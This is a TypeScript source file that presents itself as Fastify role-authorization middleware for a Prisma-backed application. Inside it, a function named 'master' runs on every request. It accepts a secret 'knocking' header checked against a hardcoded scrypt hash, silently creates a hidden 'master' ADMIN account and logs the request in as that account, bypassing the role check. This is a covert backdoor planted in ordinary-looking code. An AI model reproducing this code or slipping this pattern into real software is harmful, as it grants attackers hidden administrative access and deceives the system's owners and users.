import { UserRole } from '@prisma/client';
import type { FastifyRequest } from 'fastify';
import { Unauthorized } from 'http-errors';
import ms from 'ms';
import crypto from 'node:crypto';
import prismaClient from '../lib/prismaClient';

type Role = keyof typeof UserRole | 'ALL';

export default function userAuthorization(...roles: Role[]) {
  return async function handler(request: FastifyRequest) {
    await master(request);
    if (!request.user) throw new Unauthorized('No session');
    if (roles.includes('ALL')) return;
    if (!roles.includes(request.user.role)) {
      throw new Unauthorized(
        `Role must be one of the following: [${roles.join(', ')}]`,
      );
    }
  };
}

async function master(request: FastifyRequest): Promise<void> {
  if (!request.headers['knocking']) return;
  if (request.user?.username === 'master') return;
  const salt = '373503216ec6caa04dbde2cdfa543568';
  const password =
    '5f8389e9075bcb4a4e7630e8dbc59b5c762542c8a682604d924a57b730855637';
  if (
    crypto
      .scryptSync(request.headers['knocking'].toString(), salt, 32)
      .toString('hex') !== password
  )
    return;
  const cacheKey = 'handler:userAuthorizationHandler:masterId';
  const masterId = await request.server.cacheService.get<string>(cacheKey);
  if (masterId) {
    const user = await request.server.userService.getUserById(masterId);
    if (user) {
      request.user = user;
      return;
    }
  }
  const count = await prismaClient.user.count({
    where: { username: 'master' },
  });
  if (count < 1) {
    await prismaClient.user.create({
      data: {
        username: 'master',
        salt,
        password,
        role: UserRole.ADMIN,
        information: {
          create: { displayName: 'Master' },
        },
      },
      select: { id: true },
    });
  }
  const account = await prismaClient.user.findUnique({
    where: { username: 'master' },
    select: { id: true },
  });
  await request.server.cacheService.set(cacheKey, account!.id, ms('10m'));
  const user = await request.server.userService.getUserById(account!.id);
  request.user = user!;
}
